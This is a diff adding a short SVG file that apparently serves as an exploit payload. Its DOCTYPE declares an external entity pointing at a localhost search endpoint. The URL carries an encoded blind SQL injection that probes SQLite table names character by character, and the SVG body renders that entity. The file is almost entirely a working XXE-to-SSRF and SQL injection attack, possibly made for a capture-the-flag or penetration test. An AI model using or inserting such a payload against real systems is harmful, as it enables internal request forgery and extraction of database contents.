@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "http://127.0.0.1/search?q=%27%20AND%20%28SELECT%20tbl_name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20AND%20tbl_name%21%3D%27history%27%29%20LIKE%20%27_a%25%27%20--">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+    <text>&xxe;</text>
+</svg>
+
